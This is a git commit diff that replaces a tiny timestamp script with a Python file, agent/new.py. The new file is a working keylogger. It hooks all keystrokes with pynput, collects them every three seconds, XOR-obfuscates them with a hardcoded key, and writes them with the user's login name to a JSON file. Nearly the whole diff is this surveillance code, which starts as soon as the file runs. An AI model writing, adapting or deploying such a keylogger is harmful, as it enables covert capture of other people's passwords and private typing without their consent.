2cd00dc4e81ffff8c6eebda56f505313c13d759f
jacobsun211 <jacobsun211@gmail.com>
2025-09-07 11:44:38 +0300

    Update and rename חותמת זמן.py to new.py
    1.6

---
+++ agent/new.py
@@ -0,0 +1,94 @@
+import threading
+from pynput import keyboard
+from datetime import datetime
+import json
+import os
+from flask import jsonify
+import time
+
+
+
+class IKeylogger:
+    def __init__(self):
+        self.my_list = []
+        self.listener = None
+
+    def on_press(self, key):
+        try:
+            tempKey = str(key.char)
+        except AttributeError:
+            if key == keyboard.Key.backspace:
+                if self.my_list:
+                    self.my_list.pop()
+                return
+            elif key == keyboard.Key.enter:
+                tempKey = '\n'
+            elif key == keyboard.Key.space:
+                tempKey = ' '
+            else:
+                tempKey = str(key)
+        self.my_list.append(tempKey)
+
+
+    def start_logging(self):
+        self.listener = keyboard.Listener(on_press=self.on_press)
+        self.listener.start()
+
+    def stop_logging(self):
+        self.listener.stop()
+
+    def get_logged_keys(self):
+        keys = "".join(self.my_list)
+        self.my_list = []
+        return keys
+
+
+
+class AddToFile():
+    def __init__(self):
+        self.timestamps = []
+
+    def create_file(self, combined_keys):
+        if not combined_keys:
+            return
+
+        filename = "PC1.json"
+        timestamps = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
+
+        data = {"machine": os.getlogin(), "logs": {}}    # יוצר JSON חדש במקרה ואין
+
+        data["logs"][timestamps] = combined_keys    # מכין את המידע שצריך להכניס לJSON
+
+        with open(filename, "w") as file:
+            json.dump(data,file)        # מכניס את המידע לJSON
+
+        # json.dump(data, open(filename, "w"))
+
+
+
+
+    def xor_encrypt(self, text, key):
+        return ''.join(f"{ord(c) ^ ord(key[i % len(key)]):02x}"
+                       for i, c in enumerate(text))
+
+class Manager:
+    def __init__(self):
+        self.keylogger = IKeylogger()
+        self.add = AddToFile()
+
+    def run(self):
+        self.keylogger.start_logging()
+        while True:
+            time.sleep(3)
+            keys = self.keylogger.get_logged_keys()
+            data = self.add.xor_encrypt(keys,"01234567891")
+            self.add.create_file(data)
+            print(data)
+            if keys == "Key.ctrl_l": # ctrl+c עוצר את התוכנה אחרי שהוקלד
+                self.keylogger.stop_logging()
+                break
+
+
+
+
+Manager().run()
--- agent/חותמת זמן.py
+++
@@ -1,7 +0,0 @@
-from datetime import datetime
-
-
-def timestamp():
-    return f"\n***** {datetime.now().strftime('date: %Y-%m-%d  time: %H:%M:%S')} *****"
-
-print(timestamp())
